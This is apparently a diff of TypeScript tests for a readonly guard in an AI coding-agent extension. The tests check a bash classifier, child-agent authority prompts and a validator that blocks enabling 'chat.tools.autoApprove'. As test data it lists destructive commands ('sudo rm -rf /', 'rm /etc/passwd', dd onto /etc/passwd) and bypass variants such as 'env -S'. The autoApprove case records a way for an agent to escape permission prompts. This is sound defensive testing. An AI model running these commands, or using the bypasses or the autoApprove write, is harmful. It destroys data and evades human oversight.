+			/Operation not permitted/,
+		);
+	} else {
+		// Fallback: classifyBashCommand blocks at the spawnHook
+		await assert.rejects(
+			bashTool.execute("bash-1", { command: "sudo rm -rf /" }, undefined, undefined, {}),
+			/Readonly mode: command blocked/,
+		);
+	}
+
+	// Also verify that a safe command is ALLOWED through the child bash tool
+	await assert.doesNotReject(
+		bashTool.execute("bash-2", { command: "ls -la" }, undefined, undefined, {}),
+		/Readonly mode: command blocked/,
+	);
+});
+
+test("spawn includes write/edit plus child config-validation overrides when readonly is off", async () => {
+	// The config-validated custom write/edit tools replace the native built-in
+	// tools via pi's session factory (custom tools .set() over same-name
+	// built-in tools). This test verifies the custom tools exist, validate
+	// dangerous writes, and are the only write/edit tools the child receives.
+	const pi = new MockPi();
+	pi.setActiveTools(["read", "bash", "write", "edit", "spawn"]);
+	const state = createState();
+	state.readonlyEnabled = false;
+
+	let seenTools: string[] = [];
+	let seenCustomTools: any[] = [];
+	const mockFactory = async (config: any) => {
+		seenTools = config.tools;
+		seenCustomTools = config.customTools;
+		const session = {
+			messages: [] as any[],
+			prompt: async () => {
+				session.messages = [{ role: "assistant", content: [{ type: "text", text: "done" }] }];
+			},
+			abort: async () => {},
+			getSessionStats: () => undefined,
+		};
+		return { session: session as any };
+	};
+
+	registerSpawnTool(pi as any, state, mockFactory as any);
+	await pi.tools.get("spawn").execute(
+		"spawn-1",
+		{ prompt: "Do the task" },
+		undefined,
+		undefined,
+		{ model: { id: "mock-model" }, cwd: "/tmp" },
+	);
+
+	assert.equal(seenTools.includes("write"), true, "write should be included");
+	assert.equal(seenTools.includes("edit"), true, "edit should be included");
+
+	// Only one write/edit tool each — native built-ins are replaced by
+	// config-validated versions (pi SDK uses .set() for same-name collision).
+	const writeTools = seenCustomTools.filter((t) => t.name === "write");
+	const editTools = seenCustomTools.filter((t) => t.name === "edit");
+	assert.equal(writeTools.length, 1, "exactly one write tool (config-validated)");
+	assert.equal(editTools.length, 1, "exactly one edit tool (config-validated)");
+	const [writeTool] = writeTools;
+	const [editTool] = editTools;
+	assert.ok(writeTool, "child write should be overridden for config validation");
+	assert.ok(editTool, "child edit should be overridden for config validation");
+	await assert.rejects(
+		writeTool.execute("write-1", {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "chat.tools.autoApprove": true }),
+		}, undefined, undefined, {}),
+		/chat\.tools\.autoApprove/,
+	);
+	await assert.rejects(
+		editTool.execute("edit-1", {
+			path: ".vscode/settings.json",
+			edits: [{ oldText: "old", newText: '"chat.tools.autoApprove": true' }],
+		}, undefined, undefined, {}),
+		/rewritten with write/,
+	);
+});
+
+test("spawn prompt includes readonly notice when enabled", async () => {
+	const pi = new MockPi();
+	pi.setActiveTools(["read", "bash", "spawn"]);
+	const state = createState();
+	state.readonlyEnabled = true;
+
+	let seenPrompt = "";
+	const mockFactory = async () => {
+		const session = {
+			messages: [] as any[],
+			prompt: async (prompt: string) => {
+				seenPrompt = prompt;
+				session.messages = [{ role: "assistant", content: [{ type: "text", text: "done" }] }];
+			},
+			abort: async () => {},
+			getSessionStats: () => undefined,
+		};
+		return { session: session as any };
+	};
+
+	registerSpawnTool(pi as any, state, mockFactory as any);
+	await pi.tools.get("spawn").execute(
+		"spawn-1",
+		{ prompt: "Do the task" },
+		undefined,
+		undefined,
+		{ model: { id: "mock-model" }, cwd: "/tmp" },
+	);
+
+	assert.match(seenPrompt, /readonly authority/);
+	assert.match(seenPrompt, /Readonly restrictions apply/);
+	assert.doesNotMatch(seenPrompt, /same authority as the parent/);
+});
+
+test("spawn prompt uses standard authority wording when readonly is off", async () => {
+	const pi = new MockPi();
+	pi.setActiveTools(["read", "bash", "spawn"]);
+	const state = createState();
+	state.readonlyEnabled = false;
+
+	let seenPrompt = "";
+	const mockFactory = async () => {
+		const session = {
+			messages: [] as any[],
+			prompt: async (prompt: string) => {
+				seenPrompt = prompt;
+				session.messages = [{ role: "assistant", content: [{ type: "text", text: "done" }] }];
+			},
+			abort: async () => {},
+			getSessionStats: () => undefined,
+		};
+		return { session: session as any };
+	};
+
+	registerSpawnTool(pi as any, state, mockFactory as any);
+	await pi.tools.get("spawn").execute(
+		"spawn-1",
+		{ prompt: "Do the task" },
+		undefined,
+		undefined,
+		{ model: { id: "mock-model" }, cwd: "/tmp" },
+	);
+
+	assert.match(seenPrompt, /same authority as the parent/);
+	assert.doesNotMatch(seenPrompt, /read-only authority/);
+	assert.doesNotMatch(seenPrompt, /Readonly restrictions apply/);
+});
+
+
+
+// ── Readonly mode: session rehydration ─────────────────────────────
+
+test("session_start rehydrates readonly from branch entries", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const statuses = new Map<string, string | undefined>();
+	const branch = [
+		{ type: "custom", customType: "agenticoding-readonly", data: { enabled: false } },
+		{ type: "custom", customType: "agenticoding-readonly", data: { enabled: true } },
+	];
+
+	const sessionStartHandlers = pi.handlers.get("session_start")!;
+	for (const handler of sessionStartHandlers) {
+		await handler({ reason: "resume" }, {
+			hasUI: true,
+			ui: {
+				theme: { fg: (_n: string, t: string) => t },
+				setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+				setWidget: () => {},
+			},
+			sessionManager: { getBranch: () => branch },
+			getContextUsage: () => null,
+		});
+	}
+
+	const s = statuses.get("agenticoding-readonly");
+	assert.ok(s?.includes("readonly"), "readonly indicator should be shown after rehydrating true");
+});
+
+test("session_start clears readonly indicator on /new", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const statuses = new Map<string, string | undefined>();
+
+	// First: enable readonly via command
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	assert.ok(statuses.get("agenticoding-readonly")?.includes("readonly"));
+
+	// Now: /new should clear it
+	const sessionStartHandlers = pi.handlers.get("session_start")!;
+	for (const handler of sessionStartHandlers) {
+		await handler({ reason: "new" }, {
+			hasUI: true,
+			ui: {
+				theme: { fg: (_n: string, t: string) => t },
+				setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+				setWidget: () => {},
+			},
+			sessionManager: { getBranch: () => [] },
+			getContextUsage: () => null,
+		});
+	}
+
+	assert.equal(statuses.get("agenticoding-readonly"), undefined, "readonly indicator should be cleared on /new");
+});
+
+test("--readonly CLI flag does not override branch state when branch has entries", async () => {
+	const pi = new MockPi();
+	pi.flags.set("readonly", true);
+	registerAgenticoding(pi as any);
+
+	const statuses = new Map<string, string | undefined>();
+	const branch = [
+		{ type: "custom", customType: "agenticoding-readonly", data: { enabled: false } },
+	];
+
+	const sessionStartHandlers = pi.handlers.get("session_start")!;
+	for (const handler of sessionStartHandlers) {
+		await handler({ reason: "resume" }, {
+			hasUI: true,
+			ui: {
+				theme: { fg: (_n: string, t: string) => t },
+				setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+				setWidget: () => {},
+			},
+			sessionManager: { getBranch: () => branch },
+			getContextUsage: () => null,
+		});
+	}
+
+	// Branch has an explicit OFF entry; CLI flag only applies when no entries exist.
+	const s = statuses.get("agenticoding-readonly");
+	assert.equal(s, undefined, "branch state should win over CLI flag");
+});
+
+test("--readonly CLI flag applies on session_start for new sessions", async () => {
+	const pi = new MockPi();
+	pi.flags.set("readonly", true);
+	registerAgenticoding(pi as any);
+
+	const statuses = new Map<string, string | undefined>();
+	const sessionStartHandlers = pi.handlers.get("session_start")!;
+	for (const handler of sessionStartHandlers) {
+		await handler({ reason: "new" }, {
+			hasUI: true,
+			ui: {
+				theme: { fg: (_n: string, t: string) => t },
+				setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+				setWidget: () => {},
+			},
+			sessionManager: { getBranch: () => [] },
+			getContextUsage: () => null,
+		});
+	}
+
+	assert.ok(statuses.get("agenticoding-readonly")?.includes("readonly"));
+});
+
+test("session_start clears stale readonly state on resume when the branch has no readonly entry", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const statuses = new Map<string, string | undefined>();
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+	assert.ok(statuses.get("agenticoding-readonly")?.includes("readonly"));
+
+	const sessionStartHandlers = pi.handlers.get("session_start")!;
+	for (const handler of sessionStartHandlers) {
+		await handler({ reason: "resume" }, {
+			hasUI: true,
+			ui: {
+				theme: { fg: (_n: string, t: string) => t },
+				setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+				setWidget: () => {},
+			},
+			sessionManager: { getBranch: () => [] },
+			getContextUsage: () => null,
+		});
+	}
+
+	assert.equal(statuses.get("agenticoding-readonly"), undefined);
+});
+
+// ── Readonly mode: context hook nudges ─────────────────────────────
+
+test("readonly ON nudge is delivered via context hook", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	// Toggle readonly ON
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const [contextHandler] = pi.handlers.get("context")!;
+	const result = await contextHandler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 10 }), sessionManager: { getBranch: () => [] } },
+	);
+
+	assert.equal(result.messages.length, 2);
+	assert.equal(result.messages[1].customType, "agenticoding-readonly-nudge");
+	assert.match(result.messages[1].content, /Readonly mode is active/);
+});
+
+test("readonly OFF nudge is delivered when the current tree has a prior ON entry", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	// Toggle ON then OFF
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const branch = [
+		{ type: "custom", customType: "agenticoding-readonly", data: { enabled: true } },
+		{ type: "custom", customType: "agenticoding-readonly", data: { enabled: false } },
+	];
+	const [contextHandler] = pi.handlers.get("context")!;
+	const result = await contextHandler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 10 }), sessionManager: { getBranch: () => branch } },
+	);
+
+	assert.equal(result.messages[1].customType, "agenticoding-readonly-nudge");
+	assert.match(result.messages[1].content, /turned off/);
+});
+
+test("readonly OFF nudge is delivered after an explicit disable", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const [contextHandler] = pi.handlers.get("context")!;
+	const result = await contextHandler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 10 }), sessionManager: { getBranch: () => [] } },
+	);
+
+	assert.ok(result && "messages" in result);
+	assert.match((result as any).messages.at(-1).content, /turned off/);
+});
+
+test("readonly OFF nudge includes a handoff hint after high-context disable", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const branch = [
+		{ type: "custom", customType: "agenticoding-readonly", data: { enabled: true } },
+		{ type: "custom", customType: "agenticoding-readonly", data: { enabled: false } },
+	];
+	const [contextHandler] = pi.handlers.get("context")!;
+	const result = await contextHandler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 61 }), sessionManager: { getBranch: () => branch } },
+	);
+
+	assert.match(result.messages[1].content, /Context was at 61%/);
+	assert.match(result.messages[1].content, /if the work changed topics, you can handoff now/);
+});
+
+test("readonly nudge is one-shot — not re-delivered on subsequent calls", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	// Toggle readonly ON
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const [contextHandler] = pi.handlers.get("context")!;
+
+	// First call: delivers ON nudge
+	await contextHandler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 10 }), sessionManager: { getBranch: () => [] } },
+	);
+
+	// Second call: no nudge
+	const result = await contextHandler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 2 }] },
+		{ getContextUsage: () => ({ percent: 10 }), sessionManager: { getBranch: () => [] } },
+	);
+
+	assert.equal(result, undefined, "nudge should not be re-delivered");
+});
+
+test("session_tree rehydrates readonly from branch", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const statuses = new Map<string, string | undefined>();
+	const branch = [
+		{ type: "custom", customType: "agenticoding-readonly", data: { enabled: true } },
+	];
+
+	const [sessionTreeHandler] = pi.handlers.get("session_tree")!;
+	await sessionTreeHandler({}, {
+		hasUI: true,
+		ui: {
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		sessionManager: { getBranch: () => branch },
+		getContextUsage: () => null,
+	});
+
+	const s = statuses.get("agenticoding-readonly");
+	assert.ok(s?.includes("readonly"), "session_tree should rehydrate readonly");
+});
+
+test("session_tree rehydrates readonly-off nudge after branch change", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const statuses = new Map<string, string | undefined>();
+	const [sessionTreeHandler] = pi.handlers.get("session_tree")!;
+	const [contextHandler] = pi.handlers.get("context")!;
+
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		getContextUsage: () => ({ percent: 12 }),
+	});
+
+	await sessionTreeHandler({}, {
+		hasUI: true,
+		ui: {
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		sessionManager: { getBranch: () => [] },
+		getContextUsage: () => ({ percent: 12 }),
+	});
+	assert.equal(statuses.get("agenticoding-readonly"), undefined);
+
+	const result = await contextHandler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 12 }), sessionManager: { getBranch: () => [] } },
+	);
+	assert.ok(result && "messages" in result);
+	assert.match((result as any).messages.at(-1).content, /turned off/);
+});
+
+test("session_tree reapplies --readonly and clears stale readonly on no-entry branches", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	const statuses = new Map<string, string | undefined>();
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+	assert.ok(statuses.get("agenticoding-readonly")?.includes("readonly"));
+
+	const [sessionTreeHandler] = pi.handlers.get("session_tree")!;
+	await sessionTreeHandler({}, {
+		hasUI: true,
+		ui: {
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		sessionManager: { getBranch: () => [] },
+		getContextUsage: () => null,
+	});
+	assert.equal(statuses.get("agenticoding-readonly"), undefined, "no-entry branch should clear stale readonly");
+
+	pi.flags.set("readonly", true);
+	await sessionTreeHandler({}, {
+		hasUI: true,
+		ui: {
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		sessionManager: { getBranch: () => [] },
+		getContextUsage: () => null,
+	});
+	assert.ok(statuses.get("agenticoding-readonly")?.includes("readonly"), "CLI flag should win during session_tree rehydration");
+});
+
+test("--readonly rehydration does not append synthetic history entries", async () => {
+	const pi = new MockPi();
+	pi.flags.set("readonly", true);
+	registerAgenticoding(pi as any);
+
+	const ctx = {
+		hasUI: true,
+		ui: {
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		sessionManager: { getBranch: () => [] },
+		getContextUsage: () => null,
+	};
+
+	for (const handler of pi.handlers.get("session_start")!) {
+		await handler({ reason: "resume" }, ctx as any);
+	}
+	const [sessionTreeHandler] = pi.handlers.get("session_tree")!;
+	await sessionTreeHandler({}, ctx as any);
+
+	assert.equal(pi.appendedEntries.length, 0);
+});
+
+test("resetState clears readonly fields", () => {
+	const state = createState();
+	state.readonlyEnabled = true;
+	state.readonlyNudgePending = true;
+	resetState(state);
+	assert.equal(state.readonlyEnabled, false);
+	assert.equal(state.readonlyNudgePending, false);
+});
+
+test("readonly shortcut is registered and gated on isIdle", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	assert.ok(pi.shortcuts.has("ctrl+shift+r"), "shortcut should be registered");
+
+	const shortcut = pi.shortcuts.get("ctrl+shift+r")!;
+
+	// isIdle = false: should not toggle
+	const statuses = new Map<string, string | undefined>();
+	await shortcut.handler({
+		isIdle: () => false,
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+	assert.equal(statuses.get("agenticoding-readonly"), undefined, "should not toggle when not idle");
+
+	// isIdle = true: should toggle
+	await shortcut.handler({
+		isIdle: () => true,
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: (key: string, val: string | undefined) => statuses.set(key, val),
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+	assert.ok(statuses.get("agenticoding-readonly")?.includes("readonly"), "should toggle when idle");
+});
+
+test("readonly toggle persists entry via appendEntry", () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	assert.equal(pi.appendedEntries.length, 1);
+	assert.equal(pi.appendedEntries[0].customType, "agenticoding-readonly");
+	assert.equal(pi.appendedEntries[0].data.enabled, true);
+});
+
+
+
+test("classifyBashCommand pipes and shell chaining stay direct for non-mutating commands", () => {
+	assert.equal(isDirect("cat file | sort"), true, "cat | sort is safe");
+	assert.equal(isDirect("ls -la | head -5"), true, "ls | head is safe");
+	assert.equal(isDirect("export PATH=/tmp:$PATH; ls"), true, "shell state changes are not blocked by readonly");
+});
+
+test("classifyBashCommand block reasons stay mutation-focused", () => {
+	const check = (cmd: string, expected: string) => {
+		const v = classifyBashCommand(cmd, "/workspace");
+		assert.equal(v.ok, false, `${cmd} should be blocked`);
+		if (!v.ok) {
+			assert.match(v.reason, new RegExp(expected, "i"), `reason for ${cmd}`);
+		}
+	};
+
+	check("echo hi > out.txt", "write redirect");
+	check("rm file.txt", "outside temp");
+	check("git add .", "mutable git");
+	check("echo $(rm file.txt)", "command substitution");
+});
+
+test("classifyBashCommand blocks find mutation and allows readonly find", () => {
+	assert.equal(isBlocked("find . -exec rm {} +"), true, "find -exec rm is blocked");
+	assert.equal(isBlocked("find . -delete"), true, "find -delete is blocked outside temp");
+	assert.equal(isBlocked("find . -fprint out.txt"), true, "find -fprint is blocked outside temp");
+	assert.equal(isDirect(`find ${os.tmpdir()} -delete`, "/workspace"), true, "temp-only delete is allowed");
+	assert.equal(isDirect("find . -name \"*.ts\""), true, "find -name is direct");
+});
+
+test("classifyBashCommand allows cd and heredocs when they do not write outside temp", () => {
+	assert.equal(isDirect("cd /tmp"), true, "cd is direct");
+	assert.equal(isDirect("cd /var/log && ls"), true, "cd && ls is direct");
+	assert.equal(isDirect("cat <<EOF\nhello\nEOF"), true, "plain heredoc is direct");
+	assert.equal(isBlocked("cat <<EOF\n$(rm file.txt)\nEOF"), true, "mutating substitution in heredoc is blocked");
+});
+
+test("classifyBashCommand blocks sudo with direct mutation", () => {
+	assert.equal(isBlocked("sudo rm /etc/passwd"), true, "sudo rm is blocked");
+	assert.equal(isBlocked("sudo -u root rm /etc/passwd"), true, "sudo -u root rm is blocked");
+});
+
+test("classifyBashCommand blocks sudo with interpreter -c inline script", () => {
+	assert.equal(isBlocked("sudo bash -c 'rm /etc/passwd'"), true, "sudo bash -c rm is blocked");
+	assert.equal(isBlocked("sudo sh -c 'echo hi > /etc/config'"), true, "sudo sh -c with redirect blocked");
+	assert.equal(isBlocked("sudo -u root bash -c \"rm -rf /etc\""), true, "sudo -u root bash -c rm blocked");
+});
+
+test("classifyBashCommand allows sudo with safe interpreter -c inline script", () => {
+	assert.equal(isDirect("sudo bash -c 'echo hello'"), true, "sudo bash -c echo is safe");
+});
+
+test("classifyBashCommand blocks sed -i in-place mutation", () => {
+	assert.equal(isBlocked("sed -i 's/a/b/g' file.txt"), true, "sed -i is blocked outside temp");
+	assert.equal(isBlocked("sed -i.bak 's/a/b/' /etc/config"), true, "sed -i.bak is blocked");
+});
+
+test("classifyBashCommand blocks dd output mutation", () => {
+	assert.equal(isBlocked("dd if=/dev/zero of=/etc/passwd bs=1 count=1"), true, "dd of= outside temp is blocked");
+	assert.equal(isDirect("dd if=/dev/zero of=" + os.tmpdir() + "/test bs=1 count=0"), true, "dd of= inside temp is allowed");
+});
+
+test("classifyBashCommand blocks perl in-place mutation", () => {
+	assert.equal(isBlocked("perl -pi -e 's/a/b/g' file.txt"), true, "perl -pi is blocked outside temp");
+});
+
+test("classifyBashCommand blocks ruby in-place mutation", () => {
+	assert.equal(isBlocked("ruby -pi -e 's/a/b/g' file.txt"), true, "ruby -pi is blocked outside temp");
+});
+
+test("getPackageManagerMutationReason blocks package manager mutations", () => {
+	assert.match(getPackageManagerMutationReason("npm install lodash") ?? "", /npm install lodash/);
+	assert.equal(getPackageManagerMutationReason("ls -la"), null);
+});
+
+test("classifyBashCommand blocks package manager mutations", () => {
+	assert.equal(isBlocked("npm install lodash"), true, "npm install is blocked");
+	assert.equal(isBlocked("pip install flask"), true, "pip install is blocked");
+	assert.equal(isBlocked("apt-get install nginx"), true, "apt-get install is blocked");
+	assert.equal(isBlocked("brew install node"), true, "brew install is blocked");
+	assert.equal(isBlocked("pnpm add express"), true, "pnpm add is blocked");
+	assert.equal(isBlocked("cargo build"), true, "cargo build is blocked");
+	assert.equal(isBlocked("gem install rails"), true, "gem install is blocked");
+});
+
+test("classifyBashCommand blocks env prefix with mutation command", () => {
+	assert.equal(isBlocked("env VAR=value rm file.txt"), true, "env rm is blocked");
+	assert.equal(isBlocked("env -i PATH=/tmp rm file.txt"), true, "env -i rm is blocked");
+});
+
+test("classifyBashCommand blocks command prefix with mutation", () => {
+	assert.equal(isBlocked("command rm file.txt"), true, "command rm is blocked");
+});
+
+test("classifyBashCommand blocks >> append redirect to unsafe target", () => {
+	assert.equal(isBlocked("echo hi >> /etc/config"), true, ">> append to outside temp is blocked");
+	const tmpFile = os.tmpdir() + "/test-append.txt";
+	assert.equal(isDirect("echo hi >> " + tmpFile), true, ">> append to temp is allowed");
+});
+
+test("classifyBashCommand blocks >| noclobber redirect to unsafe target", () => {
+	assert.equal(isBlocked("echo hi >| /etc/config"), true, ">| noclobber override to outside temp is blocked");
+});
+
+test("classifyBashCommand blocks quoted paths with spaces outside temp", () => {
+	assert.equal(isBlocked("rm 'My File.txt'"), true, "rm with quoted space path is blocked outside temp");
+	assert.equal(isBlocked("touch \"My File.txt\""), true, "touch with quoted space path is blocked outside temp");
+	const tmpFile = "\"" + os.tmpdir() + "/My File.txt\"";
+	assert.equal(isDirect("rm " + tmpFile), true, "rm with quoted space path in temp is allowed");
+});
+
+test("classifyBashCommand blocks path traversal attacks", () => {
+	assert.equal(isBlocked("rm /tmp/../etc/passwd"), true, "path traversal outside temp is blocked");
+	assert.equal(isBlocked("rm /private/var/tmp/../../../etc/passwd"), true, "relative traversal outside temp is blocked");
+});
+
+// ── classifyBashCommand: exact-string contract tests ─────────────────
+
+test("classifyBashCommand exact reason: git mutable block", () => {
+	const v = classifyBashCommand("git add .", "/workspace");
+	assert.equal(v.ok, false);
+	if (!v.ok) {
+		assert.match(v.reason, /mutable git/);
+	}
+});
+
+test("classifyBashCommand exact reason: command substitution block", () => {
+	const v = classifyBashCommand("echo \$(rm file.txt)", "/workspace");
+	assert.equal(v.ok, false);
+	if (!v.ok) {
+		assert.match(v.reason, /command substitution/);
+	}
+});
+
+test("classifyBashCommand exact reason: write redirect block", () => {
+	const v = classifyBashCommand("echo hi > out.txt", "/workspace");
+	assert.equal(v.ok, false);
+	if (!v.ok) {
+		assert.match(v.reason, /write redirect blocked outside temp dir/);
+	}
+});
+
+test("classifyBashCommand exact reason: config-validator autoApprove block reason", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+	const [toolCallHandler] = pi.handlers.get("tool_call")!;
+
+	const result = await toolCallHandler({
+		toolName: "write",
+		input: {
+			path: ".vscode/settings.json",
+			content: JSON.stringify({ "chat.tools.autoApprove": true }),
+		},
+	}, {});
+	assert.equal(result.block, true);
+	assert.match(result.reason, /chat\.tools\.autoApprove/);
+	assert.match(result.reason, /CVE-2025-53773/);
+});
+
+// ── classifyBashCommand: sudo -h fix (F1) ────────────────────────────
+
+test("classifyBashCommand blocks sudo -h with mutating command", () => {
+	assert.equal(isBlocked("sudo -h rm /etc/passwd"), true, "sudo -h rm should be blocked");
+	assert.equal(isBlocked("sudo -h apt-get install nginx"), true, "sudo -h apt-get should be blocked");
+});
+
+// ── classifyBashCommand: env -u fix (F2) ─────────────────────────────
+
+test("classifyBashCommand blocks env -u with mutating command", () => {
+	assert.equal(isBlocked("env -u HOME rm /etc/passwd"), true, "env -u HOME rm blocked");
+	assert.equal(isBlocked("env --unset HOME rm /etc/passwd"), true, "env --unset HOME rm blocked");
+});
+
+// ── classifyBashCommand: touch -t/-d/-r (H1) ─────────────────────────
+
+test("classifyBashCommand allows touch with -t/-d/-r flags inside temp", () => {
+	const tmp = os.tmpdir();
+	assert.equal(isDirect(`touch -t 202001010000 ${tmp}/safe`), true, "touch -t timestamp inside temp");
+	assert.equal(isDirect(`touch -d '2020-01-01' ${tmp}/safe`), true, "touch -d date inside temp");
+	assert.equal(isDirect(`touch -r ${tmp}/ref ${tmp}/target`), true, "touch -r ref file inside temp");
+});
+
+// ── classifyBashCommand: additional command coverage ─────────────────
+
+test("classifyBashCommand blocks install, ln, truncate, unlink, rmdir outside temp", () => {
+	assert.equal(isBlocked("install /tmp/foo /etc/bar"), true, "install to outside temp");
+	assert.equal(isBlocked("ln /tmp/foo /etc/bar"), true, "ln hard link to outside temp");
+	assert.equal(isBlocked("truncate -s 0 /etc/config"), true, "truncate outside temp");
+	assert.equal(isBlocked("unlink /etc/file"), true, "unlink outside temp");
+	assert.equal(isBlocked("rmdir /etc/empty-dir"), true, "rmdir outside temp");
+	assert.equal(isBlocked("chown root /etc/file"), true, "chown outside temp");
+	assert.equal(isBlocked("chgrp root /etc/file"), true, "chgrp outside temp");
+});
+
+// ── classifyBashCommand: env fix (env -S bypass) ──────────────────
+
+test("classifyBashCommand blocks env -S bypass for mutating commands and redirects", () => {
+	assert.equal(isBlocked('env -S "rm -rf /"'), true, "env -S with rm is blocked");
+	assert.equal(isBlocked('env -u HOME -S "touch /etc/passwd"'), true, "env -u HOME -S with touch is blocked");
+	assert.equal(isBlocked('env -S "git add ."'), true, "env -S with git add is blocked");
+	assert.equal(isBlocked('env -S "echo hi > /etc/config"'), true, "env -S with redirect is blocked");
+	assert.equal(isBlocked('env KEY=value rm file.txt'), true, "env KEY=value with rm is blocked");
+});
+
+test("classifyBashCommand allows non-mutating env -S inline commands", () => {
+	assert.equal(isDirect('env -S "echo hi"'), true, "env -S with echo is allowed");
+});
+
+test("classifyBashCommand blocks env without -S with mutating direct commands", () => {
+	assert.equal(isBlocked('env rm /etc/passwd'), true, "env rm is blocked");
+	assert.equal(isBlocked('env -i rm /etc/passwd'), true, "env -i rm is blocked");
